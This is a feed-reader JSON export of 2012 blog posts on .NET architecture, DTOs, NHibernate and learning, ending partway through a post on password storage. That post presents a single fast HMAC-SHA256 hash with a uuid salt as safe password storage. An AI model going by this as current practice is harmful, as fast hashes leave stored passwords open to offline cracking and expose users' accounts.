{"subscription":{"$wrap":"$oid","v":55},"link":"http://feedproxy.google.com/~r/davybrion/~3/p7TClTj7aaA/","title":"What’s The Point Of Using WCF In A Web App?","published":{"$wrap":"$date","v":1332088108000,"h":"2012-03-18T16:28:28.000Z"},"starred":false,"read":false,"content":"<p>A very common approach of building web applications in .NET is to put most of the non-UI related code behind an internal WCF service layer. I used to be a fan of this approach as well, but these days I just don't see the benefit of that internal service layer anymore. The overhead that an internal WCF service layer adds to development, deployment and runtime performance just doesn't stack up favorably to the supposed benefits IMO. To be clear: I'm talking about WCF services that will <em>only</em> be used by the front end of your web application.</p><p>Let's talk about the overhead on development first. If you're using WCF services in your web app, you need proxies to access those services. Some people prefer to generate the proxies based on the WSDL of the services that will be used. In the worst case, this leads to regenerating proxies and all of the types that are defined in the WSDL every time you change a service contract or one of the types that are used by the services. If multiple people need to make changes to any of these concurrently, this easily leads to merging problems when people need to commit their changes. Another way is to share the same types on both sides (client & server), and implement your service proxies by inheriting from ClientBase and manually keeping the implementation of the proxies up to date with the definitions of their service contracts. This is better than regenerating a bunch of code all the time, but you're still writing a lot of redirection code for the purpose of, well, what exactly? Another possibility is to use dynamic proxies which automatically implement the service contracts but this increases the amount of infrastructure code you need to put in place and it's not always clear to everyone how exactly communication with the services happens. There's also a lot of WCF configuration for each service that you need to maintain, and it can quickly grow unwieldy.</p><p>Then there's the overhead on performance. I hope we can all agree that any operation that goes out of process is at least an order of magnitude slower than a similar operation that can be executed in process. First of all, there's the networking overhead (even if your services are hosted on the same machine as the web app) that you have to keep into account. Secondly, there is the cost of serializing and deserializing <em>everything</em> that is transferred between the client and the server. Even with the most efficient bindings and serializers, the cost of all of this quickly adds up on high-traffic web apps. That's not to say that WCF services are inherently slow. They can be very fast and efficient, but they'll never be as fast and efficient as executing that logic in process within the web app.</p><p>Finally, there's the extra overhead it introduces to the deployment phase:</p><ul><li>more endpoints to set up and transfer artifacts to</li><li>more configuration</li><li>more monitoring of endpoints</li><li>more servers if you're not hosting the services and the web app on the same machine</li></ul><p>Of course, people will argue that there a plenty of benefits to using a WCF service layer in a web app. The ones I hear about most often are the forced separation of business logic and UI logic and improved scalability and reliability. I really disagree that you need a physical separation of business and UI logic. I much prefer approaches where the separation is based on abstractions. A good example was recently posted by Ayende (<ahref=\"http://ayende.com/blog/154241/limit-your-abstractions-the-key-is-in-the-infrastructurehellip\">here</a> and <ahref=\"http://ayende.com/blog/154273/limit-your-abstractions-and-how-do-you-handle-testing\">here</a>). And when it comes to scalability/reliability, a web app that isn't dependent on a WCF service layer is as easy (or even easier depending on your setup) to scale than one that is entirely dependent on WCF services. First of all, if you care about scalability/reliability your web app should already be prepared to run behind a load balancer. If you already have a load balancer in place, you can just add more web servers to your setup when needed. If you'd host the WCF services on the same machines that are hosting the web front end, you'd get less total throughput from one server than you would if that one server could just host a web app that fully executes in process (not including the database obviously). If you're hosting the WCF services on separate machines, you'd end up with more servers to handle the load and to achieve the reliability you need than you would with just being able to add more web servers to your setup. That also increases your licensing costs. And of course, it also means increased networking overhead on every service call, which also implies that the threads on your web servers will be blocked for longer periods while they wait for those service calls to return. Unless you're calling those services asynchronously, but most people simply don't. Also, if you have serious scalability and reliability requirements you're probably better off with asynchronous messaging solutions than with SOAP services.</p><p>WCF has its benefits (though I prefer Web API's or asynchronous messaging over SOAP services these days) and it has its use cases. I just don't think internal service layers for web apps is one of them.</p><p>What are the benefits that you think an internal WCF service layer brings to your web app? And what's your opinion on how they stack up versus the downsides?</p> <div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/davybrion?a=p7TClTj7aaA:Euy9rEjAZC4:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=p7TClTj7aaA:Euy9rEjAZC4:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=p7TClTj7aaA:Euy9rEjAZC4:D7DqB2pKExk\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=p7TClTj7aaA:Euy9rEjAZC4:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=p7TClTj7aaA:Euy9rEjAZC4:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=p7TClTj7aaA:Euy9rEjAZC4:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=qj6IDK7rITs\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=p7TClTj7aaA:Euy9rEjAZC4:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=p7TClTj7aaA:Euy9rEjAZC4:gIN9vFwOqvQ\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/davybrion/~4/p7TClTj7aaA\" height=\"1\" width=\"1\"/>","author":"Davy Brion","_id":{"$wrap":"$oid","v":1204}}
{"k":"0000000084","o":"0000005925","v":"001"}
{"_id":1205,"_uid":1205,"_dt":1373742620960,"_s":"a8e9c26eb5d70df3a0895725a6cc38c4"}
{"subscription":{"$wrap":"$oid","v":55},"link":"http://feedproxy.google.com/~r/davybrion/~3/OUX2zAPDwqw/","title":"Thoughts On Learning New Things","published":{"$wrap":"$date","v":1331497343000,"h":"2012-03-11T20:22:23.000Z"},"starred":false,"read":false,"content":"<p>Jef Claes published an <ahref=\"http://jclaes.blogspot.com/2012/03/learning-hacker-way.html\">interesting post</a> about his preferred way of learning new things. There's one part in the post that I don't entirely agree with:</p><blockquote><p>I like to believe learning should be a hands-on activity as well. Basically, stop consuming, start producing. Don't get me wrong, I do think there is value in reading blog posts (I might be slightly biased on this one), reading books and watching videos, but I find that this value is marginal compared to what you gain by actually doing it.</p></blockquote><p>Hands-on activity (producing) is certainly a very important part of any learning process, but I wouldn't go as far saying that the value of reading books/blogs (consuming) is marginal compared to that of producing. In fact, I believe their value to be pretty equal. I've seen too many people who start producing simple things, and then think they've got a pretty good grasp of the technology they're using and then move on to producing more complex or bigger things without actually knowing enough of the technology they're using to support the more complex or bigger scenarios. The results certainly aren't always pretty and I'm sure each and every one of you has seen this scenario unfold with at least one developer you know. Probably more than that even.</p><p>I think in a lot of cases, people start the producing phase perhaps a bit too early and then in their enthusiasm of seeing things working sort of skip the more boring consuming that could've benefitted them a lot. Once you've started producing, you <em>need</em> to keep consuming regularly. A tremendously valuable part of any learning experience is getting feedback and insight from minds that have more experience with a given subject than yours. If you're lucky, you can get this from your coworkers. If you're not that lucky, you'll need to find other sources and books, blogs, videos, user group meetings, etc can be a great way to fill that void. And even if you do get to learn a lot from your coworkers, it <em>never</em> hurts to learn more from the experiences of others outside of your immediate circle, if only because their situations and constraints will differ from yours as well.</p><p>The other very important part about consuming is really getting to know the technology you're trying to learn. I've always found it very important to at least get an idea of how things work internally within a technology that I'm using. You certainly don't need to know all of the implementation details but just having an idea of it can really help you avoid a lot of problems once you need to use a technology in a more advanced way than in your initial experiments. Most importantly, it should give you better insights as to whether you're using the technology <em>properly</em>, which unfortunately isn't always the same as getting something working. And as a bonus, you'll probably learn about features you won't immediately need but knowing that they're there can save quite a bit of time and effort later on. Just imagine the improvement of the signal-to-noise ratios that you'd see on mailinglists, forums, and StackOverflow if everyone took the time to get a better grasp of the technologies they're using.</p><p>When I start with learning new libraries or frameworks, I usually start off by reading most (and often, all) of the official documentation of the technology before I even get into building something myself. If I want to learn a new programming language I'll look for the most recommended books for that language and buy one (or more, if I wasn't satisfied with the first one). I won't even start using the language until I've gone through the book. Once I feel like I've got a pretty good theoretical grasp of the technology, I start building something with it. I also start looking for good blogs on the technology and subscribe to them. I'll also start following influential people of the technology on Twitter. And I just continuously try to soak up as much knowledge as I can from people who're doing more impressive things with the technology than I am. At first, you might not understand everything they're talking about but after a while, things just start clicking and you're getting a really good grasp of things. None of this is a substitute for learning from producing, but it certainly is an incredible addition to it. And one that makes a world of difference, IMO.</p> <div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/davybrion?a=OUX2zAPDwqw:Aj21QQibZNE:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=OUX2zAPDwqw:Aj21QQibZNE:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=OUX2zAPDwqw:Aj21QQibZNE:D7DqB2pKExk\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=OUX2zAPDwqw:Aj21QQibZNE:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=OUX2zAPDwqw:Aj21QQibZNE:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=OUX2zAPDwqw:Aj21QQibZNE:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=qj6IDK7rITs\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=OUX2zAPDwqw:Aj21QQibZNE:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=OUX2zAPDwqw:Aj21QQibZNE:gIN9vFwOqvQ\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/davybrion/~4/OUX2zAPDwqw\" height=\"1\" width=\"1\"/>","author":"Davy Brion","_id":{"$wrap":"$oid","v":1205}}
{"k":"0000000084","o":"0000010617","v":"001"}
{"_id":1206,"_uid":1206,"_dt":1373742620960,"_s":"5837541a904ecbe1f5e4bc8e2b6a8063"}
{"subscription":{"$wrap":"$oid","v":55},"link":"http://feedproxy.google.com/~r/davybrion/~3/yuIOGHkNr8w/","title":"Architectural Drivers","published":{"$wrap":"$date","v":1330276250000,"h":"2012-02-26T17:10:50.000Z"},"starred":false,"read":false,"content":"<p>There are many different opinions and preferences when it comes to how we should deal with software architecture. My personal preference is to try not to make things more complex than they should be, while striving to maintain enough flexibility to be able to deal with future changes in both functional and non-functional requirements in a way that hopefully doesn't require extensive effort. I've always thought of good architecture essentially being something that enables developers to keep implementing new features over time at a similar cost than what it took to implement features in the early stages of development. Thus I prefer to try to find a balance between simplicity of the codebase, and making sure that the architecture scales nicely (from a code quality point of view) as the application grows in functionality. I also like to make sure that we can scale out (from a performance/throughput point of view) relatively easily if that need to scale comes up. These are just my general preferences though, and aren't always relevant to every project or suitable for every situation. I'm now in the 10th year of my career and have seen a variety of architectural styles in the wild, and of course I've read and heard about many more since the subject has always interested me a lot. I've learned that it's important to keep <em>architectural drivers</em> of a project in mind when thinking about what kind of architecture is suitable for a certain project or situation. Those drivers are often more important than whatever your personal preferences are. I've come up with a list of drivers that I think should influence the architecture used by teams or organizations.</p><h3>Simplicity/Complexity of the application</h3><p>A common mistake is to decide to use a fashionable architectural style in a project that doesn't really have enough complexity to warrant the use of said architectural style. For instance, there's no reason whatsoever to go the DDD route if your application is mostly a forms-over-data CRUD app. You won't really get any benefit from it, and you'll only increase the total cost of the required development effort. On the other hand, an application which will feature a lot of <em>behavior</em> in a complex domain will certainly benefit from using a DDD approach versus a data-driven approach that implements the behavior in a more procedural, transaction-script based approach. Be honest to your customer/employer and <em>yourself</em> and make an objective decision based on the simplicity or the complexity of the required solution that you're being paid to build. Don't let enthusiasm for a fashionable architectural style influence your decision.</p><h3>Expected lifetime of the application</h3><p>Some applications live for years and years, and some are only temporary solutions that will be phased out a year or two after having been put in production. Of course, some of those temporary solutions end up being used much longer than what was originally expected due to a variety of reasons but that certainly isn't always a given. Unless you're familiar enough with how things typically go at your client or your company to predict these things, your best bet is to just go with the initially expected lifetime of the application. Does a temporary solution require the best possible architecture out there, and the resulting impact that would have on the cost to build it? I'd say it most often doesn't. In these cases, there's nothing wrong with going for the approach that is simply good enough for what is required. Striving for perfection is expensive, and generally not worth it for short-term solutions. Conversely, if the solution is expected to last a long time, a solid architecture becomes more important and is worth the extra investment to (try to) get it right if that makes it possible to keep the costs of long-term development under control.</p><h3>Strategic importance of the application</h3><p>Some applications are meant to improve the <em>core business</em> of a company, while others play a more supportive role in something that isn't actually part of the company's core business. Some applications generate revenue (directly or by improving efficiency of revenue-generating activities) while others are meant to reduce costs, typically administrative in nature. Cost reduction is important, but it's not quite as important as revenue generation and that's a factor that should be taken under consideration. A strategically important application almost always warrants putting in the effort to come up with a good architecture because it's highly likely that the application will have to evolve in whichever direction the business evolves. That's not to say that the same kind of effort wouldn't be important for cost-reducing applications. But it just might be less important than you'd like to think it is. Again, good architecture increases the cost of the project, and the return on that investment in the big picture of the company should not be ignored.</p><h3>Skill-level/discipline of team</h3><p>Good code and good architecture requires skill and discipline. A strong team is capable of letting good architecture grow organically and keep it at a high quality level. For a mediocre team, letting it grow organically is too often a recipe for disaster. Ideally, we'd always be working with strong teams but as we all know, that simply isn't always possible. For mediocre teams, it often makes sense to put architecture in place that is more restrictive in nature and where everyone knows how the code should be structured in advance. The downside is that this typically reduces flexibility and individual creativity, and often introduces more ceremony and indirection than what many of us would ideally like to see. But it's likely that those downsides are offset by having everyone on the same page and taking some possibly difficult decisions away from people who might not be strong enough to make the right decisions. I know that sounds harsh, but that's a reality that many of us have to deal with.</p><h3>Conformity/Continuity</h3><p>A lot of IT departments or software development companies prefer to use the same architecture and frameworks/libraries for most (or even all) of their projects because it makes it easier to have people work on multiple projects. In this situation, it's easier to move people between projects or have them do maintenance work on a project they weren't initially involved in. While this often prevents going with the most suitable approach for every project, it does introduce a few benefits that are hard to argue with. People will need less time to get familiar with a code base. In-house training and sharing of knowledge get easier. Bringing in new people (especially for temporary assignments) also gets somewhat easier because you have a baseline of required skills/knowledge that should go a long way within the organization. A huge downside however, is that it creates an environment that will quickly frustrate creative developers. Also, when new strong developers are brought in, they could quickly tune out once they realize they got there too 'late' to have any influence on how projects are developed. The interesting part about this driver is that it is influenced by the skill-level-discipline driver, while simultaneously influencing it towards the future.</p><h3>Non-functional requirements</h3><p>This is the last driver on the list, but it is certainly not the least important. Obviously, architecture is greatly influenced by some important non-functional requirements. There are many factors that can have a profound influence on what the most suitable architecture of a system could be, and it's important to think about those as quickly as possible. Do you need to respond in real time? Do you need to support mobile devices? Will there be connectivity issues? Will you need to scale massively? What are the auditing requirements? Are you dependent on third-party services? Do you need to minimize resource consumption? What kind of accessibility do you have to keep into account? The list goes on and on and many of these issues can end up becoming huge problems if you don't think about them ahead of time. Of course, you can't think of everything in advance, and many non-functional requirements can be introduced during the lifetime of the application instead of being known in advance. But the more you know in advance, the better you can prepare your software for them from the beginning.</p><h3>Conclusion</h3><p>There is a virtually endless variety of architectural choices and styles that can influence how you develop software. And unfortunately, there's a lot of dogma surrounding it as well. I hope this post made it clear that there is no definitive 'right' or 'wrong' when it comes to architecture, and that (as pretty much everything else in this business) it all really depends <imgsrc='http://d18sni7re4ly7f.cloudfront.net/blog/wp-includes/images/smilies/icon_smile.gif' alt=':)' class='wp-smiley' /></p><p>I'm sure you can think of more architectural drivers, and I'd love to hear about any that you think I've forgotten.</p> <div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/davybrion?a=yuIOGHkNr8w:Ba16cBbiCmg:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=yuIOGHkNr8w:Ba16cBbiCmg:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=yuIOGHkNr8w:Ba16cBbiCmg:D7DqB2pKExk\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=yuIOGHkNr8w:Ba16cBbiCmg:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=yuIOGHkNr8w:Ba16cBbiCmg:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=yuIOGHkNr8w:Ba16cBbiCmg:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=qj6IDK7rITs\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=yuIOGHkNr8w:Ba16cBbiCmg:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=yuIOGHkNr8w:Ba16cBbiCmg:gIN9vFwOqvQ\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/davybrion/~4/yuIOGHkNr8w\" height=\"1\" width=\"1\"/>","author":"Davy Brion","_id":{"$wrap":"$oid","v":1206}}
{"k":"0000000084","o":"0000005808","v":"001"}
{"_id":1207,"_uid":1207,"_dt":1373742620960,"_s":"a2c689bc8b1ce6274691e56d6da27ace"}
{"subscription":{"$wrap":"$oid","v":55},"link":"http://feedproxy.google.com/~r/davybrion/~3/wDCy16gD6Uc/","title":"DTO’s Should Transfer Data, Not Entities","published":{"$wrap":"$date","v":1329679937000,"h":"2012-02-19T19:32:17.000Z"},"starred":false,"read":false,"content":"<p>I've read a couple of posts recently where the authors were complaining about excessive mapping to DTO's and whether or not it's worth it. I've been a fan of DTO's for a long time, but I'm not a fan of how I frequently see them being used. More specifically, I very much dislike the all-too-common approach of creating a DTO for each entity in your domain model. In the worst cases, the DTO's actually reference each other and try too hard to mimic the structure of the entities. For example, an OrderDto which has a reference to a CustomerDto and a collection of OrderLineDto instances. In those cases, I absolutely agree that all of the mapping involved introduces way too much ceremony to the codebase without really offering any concrete benefits.</p><p>Of course, it really depends on the architecture of your system.  If you're using services that are only used by the front-end of your system, then I'd still advise against making those entities available outside of the service boundary for reasons that I've discussed <ahref=\"http://davybrion.com/blog/2010/05/why-you-shouldnt-expose-your-entities-through-your-services/\">earlier</a>. That doesn't mean that you should go the entity-mimicking-DTO-route though. In fact, entity-mimicking-DTO's introduce a few of the same downsides you'd get from exposing entities directly through  your services. For an 'internal' service (i.e. only used by <em>your</em> application), I think it makes a lot more sense to use DTO's per service operation which are optimized for the use case that that service operation is meant to implement.</p><p>Essentially, an internal service's operations will be either <em>queries</em> or <em>commands</em>. When it comes to queries, why not just do the simplest thing possible? In most cases, it's sufficient to just return the data in the exact same form that the data will be displayed in. Quite often, that means a denormalized set of data where the data comes from more than one type of entity/table. There's no reason to send a bunch of entity-mimicking DTO's that reference each other to the client if you're going to use the data to populate a grid. Just send a list of DTO's which are already in the most optimal form. Populating those DTO's can then simply be done through straight SQL, a view, a stored procedure, a <ahref=\"http://davybrion.com/blog/2010/09/think-twice-before-you-map-entities-to-dtos/\">projection through your ORM</a>, a map/reduce operation, or whatever else that makes sense. The point is that in most cases, you should just <em>populate</em> those DTO's as directly as you can instead of <em>mapping</em> to those DTO's. In this case, the DTO's offer a clear-cut benefit and don't really introduce tedious ceremony code in your codebase.</p><p>As for the commands (inserts, updates, anything that <em>creates</em> something or results in something <em>happening</em>), why even use DTO's in the first place? People will often argue that the ability to reuse the entity-mimicking-DTO's for these operations is a benefit. Personally, I don't really see the benefit. The mere presence of entity-mimicking-DTO's only encourages people to use them for the queries as well. Instead, I prefer to go with types that encapsulate all of the data relevant to the current command (the data to be inserted/updated, or whatever else the command needs). In a very simple scenario, this could be an InsertCustomerCommand type which simply has properties for the data that needs to be inserted. Nobody will be confusing these types with any other purpose than what their name communicates.</p><p>If you're building a web app where the server-side code does everything in process (i.e. without a WCF service), then you can in many cases just use the entities directly without a real drawback, though I'd recommend keeping an eye on unexpected select N+1 problems, since those will frequently come up when you're preparing your views. But even in this case, using DTO's that are optimized for the scenarios in which they're being used can really simplify the query-side of your system a lot.</p><p>There's nothing inherently wrong with DTO's if you use them to simply transfer <em>data</em>. If you're using them to transfer entities, you're robbing yourself of their biggest benefit while only making things more complex than they need to be.</p> <div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/davybrion?a=wDCy16gD6Uc:Dm-fM00yqSc:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=wDCy16gD6Uc:Dm-fM00yqSc:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=wDCy16gD6Uc:Dm-fM00yqSc:D7DqB2pKExk\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=wDCy16gD6Uc:Dm-fM00yqSc:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=wDCy16gD6Uc:Dm-fM00yqSc:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=wDCy16gD6Uc:Dm-fM00yqSc:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=qj6IDK7rITs\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=wDCy16gD6Uc:Dm-fM00yqSc:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=wDCy16gD6Uc:Dm-fM00yqSc:gIN9vFwOqvQ\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/davybrion/~4/wDCy16gD6Uc\" height=\"1\" width=\"1\"/>","author":"Davy Brion","_id":{"$wrap":"$oid","v":1207}}
{"k":"0000000084","o":"0000002095","v":"001"}
{"_id":1208,"_uid":1208,"_dt":1373742620960,"_s":"3292222aff61767efe71f62b75964f1d"}
{"subscription":{"$wrap":"$oid","v":55},"link":"http://feedproxy.google.com/~r/davybrion/~3/HKKd471Hr00/","title":"NHibernate Training Course In Mechelen, Belgium – April 23/25","published":{"$wrap":"$date","v":1329062866000,"h":"2012-02-12T16:07:46.000Z"},"starred":false,"read":false,"content":"<p>I'm organizing a public NHibernate Training Course from April 23rd through April 25th in Mechelen, Belgium. This time, I'm taking care of the whole thing myself instead of working together with a more established training company (except for renting a suitable training location). This enables me to offer the course at a lower price than the previous public course. All details can be found <ahref=\"http://thatextramile.be/training/nhibernate\">here</a>. Feel free to spread the word! <imgsrc='http://d18sni7re4ly7f.cloudfront.net/blog/wp-includes/images/smilies/icon_smile.gif' alt=':)' class='wp-smiley' /></p> <div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/davybrion?a=HKKd471Hr00:M3XrImatP4I:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=HKKd471Hr00:M3XrImatP4I:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=HKKd471Hr00:M3XrImatP4I:D7DqB2pKExk\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=HKKd471Hr00:M3XrImatP4I:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=HKKd471Hr00:M3XrImatP4I:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=HKKd471Hr00:M3XrImatP4I:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=qj6IDK7rITs\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=HKKd471Hr00:M3XrImatP4I:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=HKKd471Hr00:M3XrImatP4I:gIN9vFwOqvQ\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/davybrion/~4/HKKd471Hr00\" height=\"1\" width=\"1\"/>","author":"Davy Brion","_id":{"$wrap":"$oid","v":1208}}
{"k":"0000000084","o":"0000003470","v":"001"}
{"_id":1209,"_uid":1209,"_dt":1373742620960,"_s":"8b71d32df1ace2f5f3ab1634e8dca3c1"}
{"subscription":{"$wrap":"$oid","v":55},"link":"http://feedproxy.google.com/~r/davybrion/~3/flTvNIlkmus/","title":"(Ab)Using Conventions To Enforce Good Practices","published":{"$wrap":"$date","v":1327605329000,"h":"2012-01-26T19:15:29.000Z"},"starred":false,"read":false,"content":"<p>I always tell people to explicitly specify the lengths of their string properties in their NHibernate mappings for performance reasons. If you don't specify them, the ADO.NET parameter lengths of those strings will always be set to the length of the actual string value that's been assigned to the parameter. This is a problem for SQL Server, because it can't cache those statements as efficiently as it would if the parameter lengths were always the same for a given statement. Simply put, if you don't specify the lengths, SQL Server's statement cache gets polluted with a bunch of statements that are often the same, but they're considered to be different simply because of the lengths of those string parameters. And this can really hurt the performance of your application.</p><p>Of course, not everyone remembers to set those lengths, so I thought it'd be great if I could force people to do this. With a little creative use of Fluent NHibernate's conventions, it's quite easy to enforce this:</p><div><pre class=\"brush: csharp; title: ; notranslate\">public class StringsMustHaveLengthConvention: IPropertyConvention, IPropertyConventionAcceptance{public void Apply(IPropertyInstance instance){var msg = string.Format(\"The string property '{0}' of type '{1}' does not have a length value specified, \" +\"which is required for performance reasons. Add something like this to your mapping override:\\r\\n\" +\"\\tmapping.Map(e =&gt; e.{0}).Length(50); // with an appropriate length for this property\",instance.Property.Name, instance.EntityType.Name);throw new MappingException(msg);}public void Accept(IAcceptanceCriteria&lt;IPropertyInspector&gt; criteria){criteria.Expect(x =&gt; x.Type == typeof(string)).Expect(x =&gt; x.Length == 0);}}</pre></div><p>With that convention in place, you won't even be able to run your code until you've specified the string lengths <imgsrc='http://d18sni7re4ly7f.cloudfront.net/blog/wp-includes/images/smilies/icon_smile.gif' alt=':)' class='wp-smiley' /></p> <div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/davybrion?a=flTvNIlkmus:vbJ3YxaBVC4:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=flTvNIlkmus:vbJ3YxaBVC4:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=flTvNIlkmus:vbJ3YxaBVC4:D7DqB2pKExk\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=flTvNIlkmus:vbJ3YxaBVC4:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=flTvNIlkmus:vbJ3YxaBVC4:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=flTvNIlkmus:vbJ3YxaBVC4:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=qj6IDK7rITs\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=flTvNIlkmus:vbJ3YxaBVC4:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=flTvNIlkmus:vbJ3YxaBVC4:gIN9vFwOqvQ\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/davybrion/~4/flTvNIlkmus\" height=\"1\" width=\"1\"/>","author":"Davy Brion","_id":{"$wrap":"$oid","v":1209}}
{"k":"0000000084","o":"0000007499","v":"001"}
{"_id":1210,"_uid":1210,"_dt":1373742620961,"_s":"4b89e6a2a4b0933b028f8faa5354e34e"}
{"subscription":{"$wrap":"$oid","v":55},"link":"http://feedproxy.google.com/~r/davybrion/~3/bskd34YcIcg/","title":"Stop Storing Passwords Already!","published":{"$wrap":"$date","v":1327352031000,"h":"2012-01-23T20:53:51.000Z"},"starred":false,"read":false,"content":"<p>This is largely common sense already, but I still frequently run into people who don't know how dangerous this is or how to properly store user credentials. The many Anonymous hacks in the past year that resulted in the leaking of users' passwords also show that many sites still store passwords in either clear-text or encrypted form. It's actually quite simple to store credentials safely, so here's a quick recap and example.</p><p>The biggest issue with storing passwords is that you have to assume that it's always possible that someone can get access to your database. Yes, even if it's not directly exposed to the outside world, which it <strong>never</strong> should be. Whatever security measures you've put in place to protect your database, it's a good idea to assume that sooner or later, someone will be able to punch a hole through your security measures and be able to read the data. So obviously, you really don't want to store clear-text passwords. You also don't want to store encrypted passwords because encrypted data can always be decrypted. And if people get access to those encrypted passwords even if they weren't supposed to, it'd be wise to assume that they also know how to decrypt them, or that it won't take them long to figure it out.</p><p>A much better approach is to store a hashed representation of the password instead, using a strong one-way cryptographic algorithm and a <strong>unique</strong> salt value per password. If the cryptographic algorithm is one-way, it means you can't apply another algorithm to get the original source value again. The only way to compare passwords is to apply the cryptographic algorithm on a given password using the originally used salt value, and then compare the resulting hash with the one you've stored. If they are identical, the given password is the same as the one that was used originally. If they differ, the password is invalid.</p><p>Attackers can still employ <ahref=\"http://en.wikipedia.org/wiki/Rainbow_table\">rainbow tables</a> to try to find password values that generate the same hashes as the ones in your database. Luckily, generating rainbow tables takes time and plenty of space as well so it makes it much harder for attackers to find the passwords. This is why it's so important to use a unique salt value per password. It effectively means that a rainbow table would have to be generated for every single salt value that you've used, making it practically infeasible to find the original password values.</p><p>Let's demonstrate this with a simple example. The example is from a Node.js application, but this technique can be applied with whatever technology stack you're using.</p><p>This is my User model:</p><div><pre class=\"brush: jscript; title: ; notranslate\">var mongoose = require('mongoose'),crypto = require('crypto'),uuid = require('node-uuid'),Schema = mongoose.Schema,ObjectId = Schema.ObjectId;var userSchema = new Schema({name: { type: String, required: true, unique: true },email: { type: String, required: true },salt: { type: String, required: true, default: uuid.v1 },passwdHash: { type: String, required: true }});var hash = function(passwd, salt) {return crypto.createHmac('sha256', salt).update(passwd).digest('hex');};userSchema.methods.setPassword = 